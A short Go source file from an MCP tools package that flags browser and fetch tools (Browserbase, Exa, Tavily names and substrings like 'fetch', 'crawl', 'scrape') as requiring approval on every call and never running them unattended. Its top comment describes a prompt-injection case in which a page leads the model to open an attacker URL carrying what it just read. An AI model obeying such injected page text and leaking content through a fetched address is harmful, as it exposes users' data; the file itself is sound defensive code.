package mcptools

import "strings"

// alwaysAskExact and alwaysAskParts are the tools that are declared
// tool.AlwaysAsk: each fetches an address the model chose, so a page that
// injects instructions can have the model open
// https://attacker/?q=<what it just read>, and one approval says nothing
// about the next address. The exact names are Browserbase's, Exa's and
// Tavily's; the parts catch the same kind of tool on servers nobody has
// listed.
//
// The declaration decides only a run that has no person's policy, which is
// an automation's unattended run: there such a tool is never run. In a chat
// the person's own "ask first" choices decide every tool instead
// (agent.Config.AskFirst), these included.
var alwaysAskExact = map[string]bool{
	"navigate": true, "goto": true, "open_url": true, "web_fetch_exa": true,
	"crawling_exa": true, "tavily_extract": true, "tavily_crawl": true, "tavily_map": true,
}

var alwaysAskParts = []string{"fetch", "crawl", "navigate", "scrape", "browse"}

// alwaysAsks reports whether a tool, by its server's own name, asks every
// time.
func alwaysAsks(name string) bool {
	lowered := strings.ToLower(name)
	if alwaysAskExact[lowered] {
		return true
	}
	for _, part := range alwaysAskParts {
		if strings.Contains(lowered, part) {
			return true
		}
	}
	return false
}
